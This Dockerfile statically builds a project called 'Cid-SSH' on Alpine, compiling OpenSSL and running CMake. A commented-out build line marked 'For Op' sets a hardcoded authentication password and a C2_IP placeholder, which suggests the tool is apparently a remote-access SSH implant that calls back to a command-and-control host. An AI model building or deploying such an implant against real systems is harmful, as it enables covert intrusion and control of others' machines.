# Please note that ldd is broken on alpine, and will always return ld.so in its
# output, look at elfread --program-headers and make sure there is no INTERP
# section instead
FROM alpine:latest
RUN apk add --no-cache build-base cmake autoconf libtool pkgconf git mercurial file linux-headers wget libc-dev
WORKDIR /tmp/

# Building openssl statically (Requirement for libssh)
ARG OPENSSL_VERSION=1.1.1d
RUN wget https://www.openssl.org/source/openssl-${OPENSSL_VERSION}.tar.gz && tar xf openssl-${OPENSSL_VERSION}.tar.gz
RUN cd openssl-${OPENSSL_VERSION} && ./config -fPIC && make && make install_sw

COPY . /Cid-SSH/
WORKDIR /Cid-SSH/

# Building CidSSH
RUN rm -rf build && mkdir build
RUN cd build && cmake -DCMAKE_BUILD_TYPE=Release .. && make VERBOSE=1
# For Op
#RUN mkdir build && cd build && cmake -DLIBSSH_LIBRARY=/usr/local/lib/libssh.a -DLIBSSH_INCLUDE=/tmp/libssh-0.8.7/include/ -DLIBSSH_CONFIG_FOLDER=/tmp/libssh-0.8.7/build/ -DCMAKE_BUILD_TYPE=Release -DPASSWORD_AUTH="xxxxxxxxxx" -DC2_IP="XX.XX.XX.XX" .. && make 
